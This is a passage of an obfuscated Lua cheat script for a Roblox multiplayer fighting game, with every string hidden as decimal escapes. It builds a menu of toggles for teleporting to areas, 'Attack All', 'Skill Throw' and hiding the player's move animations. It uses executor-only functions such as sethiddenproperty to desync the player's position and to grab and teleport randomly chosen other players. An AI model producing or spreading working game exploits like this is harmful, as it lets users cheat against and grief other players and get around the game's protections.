 local _IlIIIllllI = _IlIlIlIlIl.Animation.AnimationId local _llIllIlIll = _llIIIIIllI[_lIIlIllIlI.SkillBringArea.Value] local _IlllIIlIIl = _llIIllIlll.SkillBringTPBack.Value local _IlllIIlIII = (_lIIlIllIlI.SkillBringArea.Value == "\086\111\105\100") if _IlIIIllllI:match("\049\050\050\057\054\049\049\051\057\056\054") then local _lIIIlIllII = _lIlIllIlIl.CFrame game:GetService("\084\119\101\101\110\083\101\114\118\105\099\101"):Create(_lIlIllIlIl, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {CFrame = _llIllIlIll}):Play() if _IlllIIlIIl then local _lIIIllllII = tick() repeat task.wait() until not _IlIlIlIlIl.IsPlaying or tick() - _lIIIllllII > 0x8 _lIllllIIIl(_lIIIlIllII) end
 elseif _IlIIIllllI:match("\049\053\049\052\053\052\054\050\054\056\048") then task.spawn( function () task.wait(1.6) for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI ~= _llIlIIlIll then local _llIllIIlIl = _lIIlIIlllI.Character local _llIIlIIlll = _llIllIIlIl and _llIllIIlIl:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _lIlllllIII = _llIllIIlIl and _llIllIIlIl:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _llIIlIIlll and _lIlllllIII and (_llIIlIIlll.Position - _lIlIllIlIl.Position).Magnitude <= 0xF and _lIlllllIII.Health <= 0x14 then return end
 end
 end
 local _lIIIlIllII = _lIlIllIlIl.CFrame local _lIIIllllII = tick() repeat _lIllllIIIl(_llIllIlIll) task.wait() until tick() >= _lIIIllllII + 0.5 if _IlllIIlIIl then repeat task.wait() until not _IlIlIlIlIl.IsPlaying or tick() - _lIIIllllII > 0x8 _lIllllIIIl(_lIIIlIllII) end
 end
 ) elseif _IlIIIllllI:match("\049\054\049\051\057\049\048\056\055\049\056") then task.spawn( function () local _lIIIlIllII = _lIlIllIlIl.CFrame if _IlllIIlIII then local _IIIIlIllll = nil local _IIlIllIllI = _IIIlllIIlI.AnimationPlayed:Connect( function (_lIlllIllIl) if _lIlllIllIl.Animation.AnimationId:match("\049\054\053\055\049\052\054\049\050\048\050") then _IIIIlIllll = _lIlllIllIl end
 end
 ) keypress(0x20) repeat task.wait() until not _IlIlIlIlIl.IsPlaying or _IIIIlIllll keyrelease(0x20) _IIlIllIllI:Disconnect() if not _IIIIlIllll then return end
 _lIllllIIIl(_llIllIlIll) if _IlllIIlIIl then local _lIlllIllIl = tick() repeat task.wait() until not _IIIIlIllll.IsPlaying or tick() - _lIlllIllIl > 0x8 _lIllllIIIl(_lIIIlIllII) end
 return end
 local _IllIIIIlIl = workspace.CurrentCamera local _lIllIIllII = _IllIIIIlIl.CFrame _IllIIIIlIl.CameraType = Enum.CameraType.Scriptable getgenv()._cpCamActive = true local _IlIlIlIlll = _IllIIIIlIl:GetPropertyChangedSignal("\067\097\109\101\114\097\084\121\112\101"):Connect( function () if _IllIIIIlIl.CameraType ~= Enum.CameraType.Scriptable then _IllIIIIlIl.CameraType = Enum.CameraType.Scriptable end
 end
 ) RunService:BindToRenderStep("\095\099\112\067\097\109\076\111\099\107", Enum.RenderPriority.Camera.Value + 0x1, function () _IllIIIIlIl.CFrame = _lIllIIllII end
 ) keypress(0x20) local _IIIIlIllll = nil local _IIlIllIllI = _IIIlllIIlI.AnimationPlayed:Connect( function (_lIlllIllIl) if not _IIIIlIllll then _IIIIlIllll = _lIlllIllIl end
 end
 ) local _lIIIllllII = tick() repeat _lIllllIIIl(_llIllIlIll) task.wait() until _IIIIlIllll or tick() - _lIIIllllII > 1.5 _IIlIllIllI:Disconnect() keyrelease(0x20) if _IIIIlIllll then local _lIlllIllIl = tick() repeat task.wait() until not _IIIIlIllll.IsPlaying or tick() - _lIlllIllIl > 0x6 end
 _IlIlIlIlll:Disconnect() RunService:UnbindFromRenderStep("\095\099\112\067\097\109\076\111\099\107") getgenv()._cpCamActive = false _IllIIIIlIl.CameraType = Enum.CameraType.Custom if _IlllIIlIIl then _lIllllIIIl(_lIIIlIllII) end
 end
 ) elseif _IlIIIllllI:match("\049\056\049\056\050\052\050\053\049\051\051") then task.spawn( function () local _lIIIlIllII = _lIlIllIlIl.CFrame repeat task.wait() until _IlIlIlIlIl.TimePosition >= 2.6 or not _IlIlIlIlIl.IsPlaying if not _IlIlIlIlIl.IsPlaying then return end
 _lIllllIIIl(_llIllIlIll) if _IlllIIlIIl then repeat task.wait() until not _IlIlIlIlIl.IsPlaying _lIllllIIIl(_lIIIlIllII) end
 end
 ) elseif _IlIIIllllI:match("\057\052\054\051\056\051\053\054\048\048\056\054\057\054") then task.spawn( function () local _lIIIlIllII = _lIlIllIlIl.CFrame repeat task.wait() until _IlIlIlIlIl.TimePosition >= 1.50 or not _IlIlIlIlIl.IsPlaying if not _IlIlIlIlIl.IsPlaying then return end
 repeat _lIllllIIIl(_llIllIlIll) task.wait() until not _IlIlIlIlIl.IsPlaying if _IlllIIlIIl then _lIllllIIIl(_lIIIlIllII) end
 end
 ) elseif _IlIIIllllI:match("\057\053\048\051\052\048\056\051\050\048\054\050\057\050") then task.spawn( function () local _lIIIlIllII = _lIlIllIlIl.CFrame repeat task.wait() until _IlIlIlIlIl.TimePosition >= 1.7 or not _IlIlIlIlIl.IsPlaying if not _IlIlIlIlIl.IsPlaying then return end
 _lIllllIIIl(_llIllIlIll) if _IlllIIlIIl then repeat task.wait() until not _IlIlIlIlIl.IsPlaying _lIllllIIIl(_lIIIlIllII) end
 end
 ) elseif _IlIIIllllI:match("\049\049\053\052\056\052\054\057\048\053\055\050\056\056\048") then task.spawn( function () local _lIIIlIllII = _lIlIllIlIl.CFrame repeat task.wait() until _IlIlIlIlIl.TimePosition >= 0x1 or not _IlIlIlIlIl.IsPlaying if not _IlIlIlIlIl.IsPlaying then return end
 _lIllllIIIl(_llIllIlIll) if _IlllIIlIIl then repeat task.wait() until not _IlIlIlIlIl.IsPlaying _lIllllIIIl(_lIIIlIllII) end
 end
 ) elseif _IlIIIllllI:match("\049\054\053\055\049\052\054\049\050\048\050") then task.spawn( function () local _lIIIlIllII = _lIlIllIlIl.CFrame _lIllllIIIl(_llIllIlIll) local _lIIIllllII = tick() repeat task.wait() until not _IlIlIlIlIl.IsPlaying or tick() - _lIIIllllII > 0x8 if _IlllIIlIIl then _lIllllIIIl(_lIIIlIllII) end
 end
 ) end
 end
 ) end
 _lIIlIIIIlI(_llIlIIlIll.Character) _IIllIIlIlI = _llIlIIlIll.CharacterAdded:Connect( function (_IIllIIlllI) task.wait(0.1) _lIIlIIIIlI(_IIllIIlllI) end
 ) local _IIIIlIIIlI = {"\114\098\120\097\115\115\101\116\105\100\058\047\047\049\050\051\053\049\056\053\052\053\053\054","\114\098\120\097\115\115\101\116\105\100\058\047\047\049\053\051\049\049\054\056\053\054\050\056","\114\098\120\097\115\115\101\116\105\100\058\047\047\049\053\049\050\056\056\052\057\048\052\055"} local _IIlllIIIlI = {"\114\098\120\097\115\115\101\116\105\100\058\047\047\049\051\054\048\051\051\057\054\057\051\057","\114\098\120\097\115\115\101\116\105\100\058\047\047\049\053\051\051\052\057\055\052\053\053\048","\114\098\120\097\115\115\101\116\105\100\058\047\047\049\053\049\050\051\054\054\053\052\057\049"} local _lIIIlIllll = {"\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\052\055\048\051\056\057\056\050\055","\114\098\120\097\115\115\101\116\105\100\058\047\047\049\051\051\056\048\055\055\056\049\057\051","\114\098\120\097\115\115\101\116\105\100\058\047\047\049\051\057\051\053\053\052\056\053\053\050"} local _lllIIlIIll = {} local function _IllIIllIll(_IIllIIlllI) if not _IIllIIlllI then return end
 local _lIlIIllIII = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or _IIllIIlllI:WaitForChild("\072\117\109\097\110\111\105\100", 0x3) local _lIlIllIlIl = _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or _IIllIIlllI:WaitForChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116", 0x3) if not _lIlIIllIII or not _lIlIllIlIl then return end
 table.insert(_lllIIlIIll, _IIllIIlllI:GetAttributeChangedSignal("\066\108\111\099\107\105\110\103"):Connect( function () if _IIllIIlllI:GetAttribute("\066\108\111\099\107\105\110\103") and _llIIllIlll.InvisibleMoves_Block.Value then _IIllIIlllI:SetAttribute("\066\108\111\099\107\105\110\103", false) end
 end
 )) table.insert(_lllIIlIIll, _lIlIIllIII.AnimationPlayed:Connect( function (_IlIlIlIlIl) local _IlIIIllllI = _IlIlIlIlIl.Animation.AnimationId if _IlIIIllllI:match("\049\049\051\054\053\053\054\051\050\053\053") and rawget(_lIIlIllIlI.InvisibleMoves_Saitama.Value, "\073\110\118\105\115\105\098\108\101\032\084\097\098\108\101\032\070\108\105\112") then _IlIlIlIlIl:Stop() task.delay(0x3, function () _lIlIIllIII.HipHeight = 0xA task.wait(0.75) _lIlIIllIII.HipHeight = 0x0 end
 ) elseif _IlIIIllllI:match("\049\050\057\056\051\051\051\051\055\051\051") then if rawget(_lIIlIllIlI.InvisibleMoves_Saitama.Value, "\073\110\118\105\115\105\098\108\101\032\083\101\114\105\111\117\115\032\080\117\110\099\104") then _IlIlIlIlIl:Stop() end
 elseif _IlIIIllllI:match("\049\051\057\050\055\054\049\050\057\053\049") and rawget(_lIIlIllIlI.InvisibleMoves_Saitama.Value, "\073\110\118\105\115\105\098\108\101\032\079\109\110\105\045\068\105\114\101\099\116\105\111\110\097\108\032\080\117\110\099\104") then _IlIlIlIlIl:Stop() elseif _IlIIIllllI:match("\049\050\052\052\055\055\048\055\056\052\052") and rawget(_lIIlIllIlI.InvisibleMoves_Saitama.Value, "\073\110\118\105\115\105\098\108\101\032\085\108\116") then _IlIlIlIlIl:Stop() local _llIlIlIIII = tick() repeat getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } task.wait() until tick() >= _llIlIlIIII + 0x1 getgenv().desync = nil elseif _IlIIIllllI:match("\049\050\051\052\050\049\052\049\052\054\052") and rawget(_lIIlIllIlI.InvisibleMoves_Garou.Value, "\073\110\118\105\115\105\098\108\101\032\085\108\116") then _IlIlIlIlIl:Stop() elseif (_IlIIIllllI == "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\051\052\057\057\055\055\049\056\051\054" or _IlIIIllllI == "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\051\052\057\055\056\055\053\048\052\057") and rawget(_lIIlIllIlI.InvisibleMoves_Sonic.Value, "\073\110\118\105\115\105\098\108\101\032\085\108\116") then _IlIlIlIlIl:Stop() elseif _IlIIIllllI:match("\049\050\055\055\050\053\052\051\050\057\051") and rawget(_lIIlIllIlI.InvisibleMoves_Genos.Value, "\073\110\118\105\115\105\098\108\101\032\085\108\116") then _IlIlIlIlIl:Stop() elseif _IlIIIllllI:match("\049\051\049\052\054\055\049\048\055\054\050") and rawget(_lIIlIllIlI.InvisibleMoves_Genos.Value, "\073\110\118\105\115\105\098\108\101\032\073\110\099\105\110\101\114\097\116\101") then _IlIlIlIlIl:Stop() elseif _IlIIIllllI:match("\049\053\049\052\053\052\054\050\054\056\048") and rawget(_lIIlIllIlI.InvisibleMoves_AtomicSamurai.Value, "\073\110\118\105\115\105\098\108\101\032\065\116\109\111\115\032\067\108\101\097\118\101") then _IlIlIlIlIl:Stop() elseif _IlIIIllllI:match("\049\053\051\057\049\051\050\051\052\052\049") and rawget(_lIIlIllIlI.InvisibleMoves_AtomicSamurai.Value, "\073\110\118\105\115\105\098\108\101\032\085\108\116") then _IlIlIlIlIl:Stop() elseif (_IlIIIllllI:match("\049\054\049\051\057\049\048\056\055\049\056") or _IlIIIllllI:match("\049\054\049\051\057\055\048\056\055\050\055") or _IlIIIllllI:match("\049\054\049\051\057\052\048\050\053\056\050")) and rawget(_lIIlIllIlI.InvisibleMoves_Tatsumaki.Value, "\073\110\118\105\115\105\098\108\101\032\067\114\117\115\104\105\110\103\032\080\117\108\108") then _IlIlIlIlIl:Stop() elseif _IlIIIllllI:match("\049\054\053\049\053\056\053\048\049\053\051") and rawget(_lIIlIllIlI.InvisibleMoves_Tatsumaki.Value, "\073\110\118\105\115\105\098\108\101\032\087\105\110\100\115\116\111\114\109\032\070\117\114\121") then _IlIlIlIlIl:Stop() elseif _IlIIIllllI:match("\049\054\052\051\049\052\057\049\050\049\053") and rawget(_lIIlIllIlI.InvisibleMoves_Tatsumaki.Value, "\073\110\118\105\115\105\098\108\101\032\083\116\111\110\101\032\071\114\097\118\101") then _IlIlIlIlIl:Stop() elseif (_IlIIIllllI:match("\049\054\053\057\055\051\050\050\051\057\056") or _IlIIIllllI:match("\049\054\053\057\055\057\049\050\048\056\054")) and rawget(_lIIlIllIlI.InvisibleMoves_Tatsumaki.Value, "\073\110\118\105\115\105\098\108\101\032\069\120\112\117\108\115\105\118\101\032\080\117\115\104") then _IlIlIlIlIl:Stop() elseif _IlIIIllllI:match("\049\054\055\051\052\053\056\052\052\055\056") and rawget(_lIIlIllIlI.InvisibleMoves_Tatsumaki.Value, "\073\110\118\105\115\105\098\108\101\032\085\108\116") then _IlIlIlIlIl:Stop() elseif _IlIIIllllI:match("\049\053\053\050\048\049\051\050\050\051\051") and rawget(_lIIlIllIlI.InvisibleMoves_AtomicSamurai.Value, "\073\110\118\105\115\105\098\108\101\032\083\117\110\115\101\116") then _IlIlIlIlIl:Stop() elseif _IlIIIllllI:match("\049\053\054\055\054\048\055\050\052\054\057") and rawget(_lIIlIllIlI.InvisibleMoves_AtomicSamurai.Value, "\073\110\118\105\115\105\098\108\101\032\083\111\108\097\114\032\067\108\101\097\118\101") then _IlIlIlIlIl:Stop() elseif _IlIIIllllI:match("\049\054\048\054\050\052\049\048\056\048\057") and rawget(_lIIlIllIlI.InvisibleMoves_AtomicSamurai.Value, "\073\110\118\105\115\105\098\108\101\032\083\117\110\114\105\115\101") then _IlIlIlIlIl:Stop() elseif _IlIIIllllI:match("\049\054\048\054\050\055\049\050\057\052\056") and rawget(_lIIlIllIlI.InvisibleMoves_AtomicSamurai.Value, "\073\110\118\105\115\105\098\108\101\032\083\117\110\114\105\115\101\032\070\105\110\105\115\104\101\114") then _IlIlIlIlIl:Stop() elseif _IlIIIllllI:match("\049\054\048\056\050\049\050\051\055\049\050") and rawget(_lIIlIllIlI.InvisibleMoves_AtomicSamurai.Value, "\073\110\118\105\115\105\098\108\101\032\065\116\111\109\105\099\032\083\108\097\115\104") then _IlIlIlIlIl:Stop() elseif _IlIIIllllI:match("\049\054\048\053\055\052\049\049\056\056\056") and rawget(_lIIlIllIlI.InvisibleMoves_AtomicSamurai.Value, "\073\110\118\105\115\105\098\108\101\032\065\116\111\109\105\099\032\083\108\097\115\104\032\070\105\110\105\115\104\101\114") then _IlIlIlIlIl:Stop() elseif _IlIIIllllI:match("\049\055\055\057\057\050\050\052\056\054\054") and rawget(_lIIlIllIlI.InvisibleMoves_Suiryu.Value, "\066\117\108\108\101\116\032\066\097\114\114\097\103\101") then _IlIlIlIlIl:Stop() elseif _IlIIIllllI:match("\049\055\050\055\053\049\053\048\056\048\057") and rawget(_lIIlIllIlI.InvisibleMoves_Tatsumaki.Value, "\073\110\118\105\115\105\098\108\101\032\084\101\114\114\105\098\108\101\032\084\111\114\110\097\100\111") then _IlIlIlIlIl:Stop() elseif _IlIIIllllI:match("\049\055\050\055\056\052\049\053\056\053\051") and rawget(_lIIlIllIlI.InvisibleMoves_Tatsumaki.Value, "\073\110\118\105\115\105\098\108\101\032\084\101\114\114\105\098\108\101\032\084\111\114\110\097\100\111\032\070\105\110\105\115\104\101\114") then _IlIlIlIlIl:Stop() elseif table.find(_IIIIlIIIlI, _IlIIIllllI) and _llIIllIlll.InvisibleMoves_Counter.Value then _IlIlIlIlIl:AdjustWeight(-0xF423F) elseif table.find(_IIlllIIIlI, _IlIIIllllI) and _llIIllIlll.InvisibleMoves_CounterHit.Value then _IlIlIlIlIl:Stop() elseif table.find(_lIIIlIllll, _IlIIIllllI) and _llIIllIlll.InvisibleMoves_Block.Value then _IlIlIlIlIl:AdjustWeight(-0xF423F) local _IllIlIIlIl = _IIllIIlllI:FindFirstChild("\069\115\112\101\114\083\104\105\101\108\100", true) if _IllIlIIlIl then for _lIIlIllIlI, pe in pairs(_IllIlIIlIl:GetDescendants()) do if pe:IsA("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114") and not pe.Name:find("\073\109\112\097\099\116") then task.spawn( function () local _lIllIIIIII, origColor = pe.Rate, pe.Color pe.Rate = 0x2D if _llIIllIlll.InvisibleMoves_BlockColor.Value then pe.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0x0, _lIIlIllIlI.InvisibleMoves_BlockColor1.Value), ColorSequenceKeypoint.new(0.5, _lIIlIllIlI.InvisibleMoves_BlockColor2.Value), ColorSequenceKeypoint.new(0x1, _lIIlIllIlI.InvisibleMoves_BlockColor3.Value), }) end
 pe.Enabled = true repeat RunService.RenderStepped:Wait() until not _IlIlIlIlIl.IsPlaying pe.Enabled = false pe.Rate = _lIllIIIIII if _llIIllIlll.InvisibleMoves_BlockColor.Value then pe.Color = origColor end
 end
 ) end
 end
 end
 end
 end
 )) end
 _IllIIllIll(_llIlIIlIll.Character) local _IIIllIIlII = _llIlIIlIll.CharacterAdded:Connect( function (_IIllIIlllI) task.wait(0.1) _IllIIllIll(_IIllIIlllI) end
 ) table.insert(_IllIllIIll, function () if _IIIllIIlII then _IIIllIIlII:Disconnect() _IIIllIIlII = nil end
 for _lIIlIllIlI, _IllIIlIllI in ipairs(_lllIIlIIll) do pcall( function () _IllIIlIllI:Disconnect() end
 ) end
 table.clear(_lllIIlIIll) pcall( function () _llIIllIlll.InvisibleMoves_Block:SetValue(false) end
 ) pcall( function () _llIIllIlll.InvisibleMoves_BlockColor:SetValue(false) end
 ) pcall( function () _llIIllIlll.InvisibleMoves_Counter:SetValue(false) end
 ) pcall( function () _llIIllIlll.InvisibleMoves_CounterHit:SetValue(false) end
 ) end
 ) table.insert(_IllIllIIll, function () if _IIllIIlIlI then _IIllIIlIlI:Disconnect() _IIllIIlIlI = nil end
 pcall( function () _llIIllIlll.SkillBring:SetValue(false) end
 ) pcall( function () _llIIllIlll.SkillBringTPBack:SetValue(false) end
 ) end
 ) local _IIIIlIIIll = _llIlIIIIIl _IIIIlIIIll:AddToggle("\083\107\105\108\108\066\114\105\110\103", { Text = "\083\107\105\108\108\032\066\114\105\110\103", Default = false, }) _IIIIlIIIll:AddToggle("\083\107\105\108\108\066\114\105\110\103\084\080\066\097\099\107", { Text = "\084\101\108\101\112\111\114\116\032\066\097\099\107", Default = false, }) _IIIIlIIIll:AddDropdown("\083\107\105\108\108\066\114\105\110\103\065\114\101\097", { Text = "\083\107\105\108\108\032\066\114\105\110\103\032\065\114\101\097", Values = _lIIIIIlIll, Multi = false, Default = table.find(_lIIIIIlIll, "\068\101\097\116\104\032\067\111\117\110\116\101\114"), Searchable = true, }) _IIIIlIIIll:AddButton({ Text = "\084\101\108\101\112\111\114\116\032\084\111\032\065\114\101\097", Func = function () local _IlIIIIIlII = _llIIIIIllI[_lIIlIllIlI.SkillBringArea.Value] if not _IlIIIIIlII then return end
 local _IIllIIlllI = _llIlIIlIll.Character local _lIlIllIlIl = _IIllIIlllI and _IIllIIlllI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIllIIlllI and _lIlIllIlIl then _llIIIlllIl = _lIlIllIlIl.CFrame end
 _lIllllIIIl(_IlIIIIIlII) end
 , }) _IIIIlIIIll:AddButton({ Text = "\084\101\108\101\112\111\114\116\032\066\097\099\107", Func = function () _lIllllIIIl(_llIIIlllIl) end
 , }) _llIlIIIIIl:AddDivider() local _IIIlllIIII = _llIlIIIIIl _IIIlllIIII:AddToggle("\065\116\116\097\099\107\065\108\108", { Text = "\065\116\116\097\099\107\032\065\108\108", Default = false, }) _IIIlllIIII:AddDropdown("\065\116\116\097\099\107\065\108\108\077\111\118\101\115", { Text = "\077\111\118\101\115", Values = { "\083\097\118\097\103\101\032\084\111\114\110\097\100\111", "\066\114\117\116\097\108\032\066\101\097\116\100\111\119\110", "\067\114\117\115\104\101\100\032\082\111\099\107\032\086\097\114\105\097\110\116", "\084\119\105\110\032\070\097\110\103\115", }, Multi = true, Default = {}, Searchable = false, }) _llIlIIIIIl:AddDivider() _IIIlllIIII:AddToggle("\083\107\105\108\108\084\104\114\111\119", { Text = "\083\107\105\108\108\032\084\104\114\111\119", Default = false, }) _IIIlllIIII:AddDropdown("\083\107\105\108\108\084\104\114\111\119\077\111\118\101\115", { Values = { "\072\117\110\116\101\114\115\032\071\114\097\115\112", "\072\111\109\101\114\117\110", }, Multi = true, Default = {}, }) _llIlIIIIIl:AddDivider() _IIIlllIIII:AddToggle("\078\111\066\080\095\087\105\110\100\115\116\111\114\109\070\117\114\121", { Text = "\078\111\032\087\105\110\100\115\116\111\114\109\032\070\117\114\121\032\066\080", Default = false, }) _IIIlllIIII:AddToggle("\078\111\066\080\095\084\097\116\115\117\109\097\107\105\085\108\116", { Text = "\078\111\032\084\097\116\115\117\109\097\107\105\032\085\108\116\032\066\080", Default = false, }) _IIIlllIIII:AddToggle("\078\111\066\080\095\080\114\101\121\115\080\101\114\105\108", { Text = "\078\111\032\080\114\101\121\039\115\032\080\101\114\105\108\032\066\080", Default = false, }) table.insert(_IllIllIIll, function () pcall( function () _llIIllIlll.AttackAll:SetValue(false) end
 ) pcall( function () _llIIllIlll.SkillThrow:SetValue(false) end
 ) pcall( function () _llIIllIlll.NoBP_WindstormFury:SetValue(false) end
 ) pcall( function () _llIIllIlll.NoBP_TatsumakiUlt:SetValue(false) end
 ) pcall( function () _llIIllIlll.NoBP_PreysPeril:SetValue(false) end
 ) end
 ) end
 task.spawn( function () local _IIlIlIlIlI, _featErr = xpcall( function () do local _llIlIlIIlI = _llIlIIlIll:GetMouse() local _IIIlIlIIIl = game:GetService("\083\116\097\116\115") local _IlllIlIIlI = game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101") local _lllIIlIlll= game:GetService("\068\101\098\114\105\115") _lIIIllIlIl = { Flying = false, ["\084\111\117\099\104\032\070\108\105\110\103"] = false, ["\084\111\117\099\104\032\070\108\105\110\103\032\083\101\116\116\105\110\103\115"] = Vector3.new(0x0, 0x0, 0x0), ["\084\114\097\115\104\099\097\110\032\076\097\117\110\099\104"] = false, } _IllllIlIII = { Fly = false, ["\076\111\099\107\045\111\110"] = false, ["\084\111\117\099\104\032\070\108\105\110\103"]= false, } local _IlIllIlIIl = {} local _llIIIIlIIl = {} local _lllllllIll = nil local _IIlllIIIlI = {} local function _lIlIIIIlII(_lIIlIIlllI) if typeof(_lIIlIIlllI) == "\073\110\115\116\097\110\099\101" then if _lIIlIIlllI:IsA("\080\108\097\121\101\114") then return _lIIlIIlllI.Character elseif _lIIlIIlllI:IsA("\077\111\100\101\108") then return _lIIlIIlllI end
 end
 return nil end
 local function _lIlIlIIlII(_IlIlIllIll) return _IlIlIllIll and _IlIlIllIll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or nil end
 local function _IIIlIIIIll(_IlIlIllIll) return _IlIlIllIll and _IlIlIllIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or nil end
 local function _IIIllllIII() local _llIIIlIIlI = Players:GetPlayers() local _IIIllIIIIl = table.find(_llIIIlIIlI, _llIlIIlIll) if _IIIllIIIIl then table.remove(_llIIIlIIlI, _IIIllIIIIl) end
 return _llIIIlIIlI end
 local function _IIIIIIIIII(_lIlIIllIII, _IlIIIllllI) if not _lIlIIllIII then return false end
 for _lIIlIllIlI, _lIIIllllII in pairs(_lIlIIllIII:GetPlayingAnimationTracks()) do if _lIIIllllII.Animation.AnimationId:match(_IlIIIllllI) then return true end
 end
 return false end
 local function _IlIllIlIll(_IlIIIIIlII) local _IIllIIlllI = _lIlIIIIlII(_llIlIIlIll) local _lIlIllIlIl = _IIllIIlllI and _lIlIlIIlII(_IIllIIlllI) if _IIllIIlllI and _lIlIllIlIl then task.spawn( function () RunService.RenderStepped:Once( function () _lIlIllIlIl.Velocity = Vector3.new() RunService.Heartbeat:Wait() _lIlIllIlIl.Velocity = Vector3.new() end
 ) end
 ) RunService.Heartbeat:Once( function () _IlIllIlIll(_IlIIIIIlII) end
 ) end
 end
 local function _IllIlIlIlI(skipDeathBlow) local _IIlIllIlII = _IIIllllIII() if #_IIlIllIlII == 0x0 then return end
 local _IlIllIlIIl = {} for _lIIlIllIlI, _lIIlIIlllI in ipairs(_IIlIllIlII) do if not table.find(RevenantWhitelist, _lIIlIIlllI) then table.insert(_IlIllIlIIl, _lIIlIIlllI) end
 end
 if #_IlIllIlIIl == 0x0 then return end
 local _IIIIlllIll = _IlIllIlIIl[math.random(0x1, #_IlIllIlIIl)] if _IIIIlllIll == _llIlIIlIll then return end
 local _IlIIIllIIl = _lIlIIIIlII(_llIlIIlIll) local _llIllIIIII = _IlIIIllIIl and _lIlIlIIlII(_IlIIIllIIl) local _lIIlIIllll = _lIlIIIIlII(_IIIIlllIll) local _IIIlllIlll = _lIIlIIllll and _lIlIlIIlII(_lIIlIIllll) local _llIIlIlIIl = _lIIlIIllll and _IIIlIIIIll(_lIIlIIllll) if not (_IlIIIllIIl and _llIllIIIII and _lIIlIIllll and _IIIlllIlll and _llIIlIlIIl) then return end
 if skipDeathBlow then if _lIIlIIllll:GetAttribute("\085\108\116\101\100") and _lIIlIIllll:GetAttribute("\067\104\097\114\097\099\116\101\114") == "\066\097\116\116\101\114" then return end
 for _lIIlIllIlI, obj in pairs(_lIIlIIllll:GetChildren()) do if obj:IsA("\084\111\111\108") and obj.Name == "\068\101\097\116\104\032\066\108\111\119" then return end
 end
 if _IIIIIIIIII(_llIIlIlIIl, "\049\053\049\050\056\056\052\057\048\052\055") then return end
 for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do if _lIIlIIlllI ~= _llIlIIlIll and _lIIlIIlllI ~= _IIIIlllIll then local _lIIIIIlIll = _lIlIIIIlII(_lIIlIIlllI) local _IlIIIlIIlI = _lIIIIIlIll and _lIlIlIIlII(_lIIIIIlIll) local _lIIlIIIIlI = _lIIIIIlIll and _IIIlIIIIll(_lIIIIIlIll) if _lIIIIIlIll and _IlIIIlIIlI and _lIIlIIIIlI and (_IlIIIlIIlI.Position - _IIIlllIlll.Position).Magnitude <= 0x64 then if _lIIIIIlIll:GetAttribute("\085\108\116\101\100") and _lIIIIIlIll:GetAttribute("\067\104\097\114\097\099\116\101\114") == "\066\097\116\116\101\114" then return end
 for _lIIlIllIlI, obj in pairs(_lIIIIIlIll:GetChildren()) do if obj:IsA("\084\111\111\108") and obj.Name == "\068\101\097\116\104\032\066\108\111\119" then return end
 end
 if _IIIIIIIIII(_lIIlIIIIlI, "\049\053\049\050\056\056\052\057\048\052\055") then return end
 end
 end
 end
 end
 if typeof(sethiddenproperty) == "\102\117\110\099\116\105\111\110" then pcall(sethiddenproperty, _llIllIIIII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IIIlllIlll) pcall(sethiddenproperty, _IIIlllIlll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _llIllIIIII) end
 RunService.Heartbeat:Once( function () _llIllIIIII.CFrame = _IIIlllIlll.CFrame end
 ) task.wait() RunService.Heartbeat:Once( function () _llIllIIIII.CFrame = CFrame.lookAt(_llIllIIIII.Position, _IIIlllIlll.Position) end
 ) end
 local function _IIlllIIlIl(targetCFrame) local _llIIlIlllI = _lIlIIIIlII(_llIlIIlIll) local _llIIlIIIlI = _llIIlIlllI and _lIlIlIIlII(_llIIlIlllI) or _llIIlIlllI if _llIIlIlllI and _llIIlIIIlI then task.spawn( function () RunService.RenderStepped:Once( function () _llIIlIIIlI.Velocity = Vector3.new() RunService.Heartbeat:Wait() _llIIlIIIlI.Velocity = Vector3.new() end
 ) end
 ) RunService.Heartbeat:Once( function () RunService.Heartbeat:Once( function () _llIIlIIIlI.CFrame = targetCFrame end
 ) end
 ) end
 end
 local function _lllllIIlll(animParent, _IIIIIIIlII, animPriority) if not (animParent and _IIIIIIIlII) then return nil end
 local _lIIlIIIlll = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. tostring(_IIIIIIIlII):match("\037\100\043") local _IlIllllIlI = Instance.new("\065\110\105\109\097\116\105\111\110") local _lIIIIIIIlI = nil if animPriority then if animPriority == "\083\101\114\118\101\114" then _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\048\057\051\051\053\055\056\056\057\057\048\052\050" _lIIIIIIIlI = animParent:LoadAnimation(_IlIllllIlI) _IlIllllIlI.AnimationId = _lIIlIIIlll elseif animPriority == "\067\108\105\101\110\116" then _IlIllllIlI.AnimationId = _lIIlIIIlll _lIIIIIIIlI = animParent:LoadAnimation(_IlIllllIlI) _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\048\057\051\051\053\055\056\056\057\057\048\052\050" end
 else _IlIllllIlI.AnimationId = _lIIlIIIlll _lIIIIIIIlI = animParent:LoadAnimation(_IlIllllIlI) end
 return _lIIIIIIIlI end
 local function _lIlIlIllll(soundParent, soundId) if not (soundParent and soundId) then return nil end
 local _IllllIIIlI = Instance.new("\083\111\117\110\100") _IllllIIIlI.Parent = soundParent _IllllIIIlI.SoundId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. tostring(soundId):match("\037\100\043") return _IllllIIIlI end
